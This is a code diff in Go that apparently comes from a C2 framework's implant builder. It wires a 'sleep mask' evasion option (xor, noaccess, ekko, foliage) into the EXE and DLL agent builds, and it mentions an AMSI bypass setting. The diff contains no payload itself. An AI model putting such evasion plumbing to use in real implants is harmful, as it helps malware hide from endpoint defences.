@@ -639,6 +639,17 @@ func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
 			args = append(args, fmt.Sprintf("-DAGENT_PFX=%q", pfxB64))
 		}
 	}
+	// Sleep mask mode: 0=none (default), 1=xor, 2=noaccess, 3=ekko, 4=foliage
+	{
+		sleepMaskNum := 0
+		switch cfg.SleepMaskMode {
+		case "xor":      sleepMaskNum = 1
+		case "noaccess": sleepMaskNum = 2
+		case "ekko":     sleepMaskNum = 3
+		case "foliage":  sleepMaskNum = 4
+		}
+		args = append(args, fmt.Sprintf("-DAGENT_SLEEP_MASK_MODE=%d", sleepMaskNum))
+	}
 	args = append(args, sources...)
 	args = append(args, "-lwinhttp", "-lbcrypt", "-lws2_32", "-lcrypt32", "-lsecur32", "-lgdi32", "-lole32", "-loleaut32")
 
@@ -727,6 +738,16 @@ func BuildCAgentDLL(cfg BuildConfig, outDir string) (string, error) {
 		if pfxB64, err := pemToPFXBase64(cfg.AgentCertPEM, cfg.AgentKeyPEM); err == nil {
 			args = append(args, fmt.Sprintf("-DAGENT_PFX=%q", pfxB64))
 		}
+	}
+	{
+		sleepMaskNum := 0
+		switch cfg.SleepMaskMode {
+		case "xor":      sleepMaskNum = 1
+		case "noaccess": sleepMaskNum = 2
+		case "ekko":     sleepMaskNum = 3
+		case "foliage":  sleepMaskNum = 4
+		}
+		args = append(args, fmt.Sprintf("-DAGENT_SLEEP_MASK_MODE=%d", sleepMaskNum))
 	}
 	args = append(args, sources...)
 	args = append(args, "-lwinhttp", "-lbcrypt", "-lws2_32", "-lcrypt32", "-lsecur32", "-lgdi32", "-lole32", "-loleaut32")
@@ -1532,10 +1553,13 @@ func buildLDFlags(cfg BuildConfig) string {
 	if cfg.HttpHeadersRemove != "" {
 		add("HttpHeadersRemove", cfg.HttpHeadersRemove)
 	}
-	// L2-1: Sleep mask mode
-	// Always inject SleepMaskMode so GUI selection overrides config.go default
-	if cfg.SleepMaskMode != "" {
-		add("SleepMaskMode", cfg.SleepMaskMode)
+	// L2-1: Sleep mask mode — always inject; empty value defaults to "none"
+	{
+		mode := cfg.SleepMaskMode
+		if mode == "" {
+			mode = "none"
+		}
+		add("SleepMaskMode", mode)
 	}
 	// L2-2: AMSI bypass method — always inject so GUI selection overrides config.go default
 	if cfg.AMSIMethod != "" {
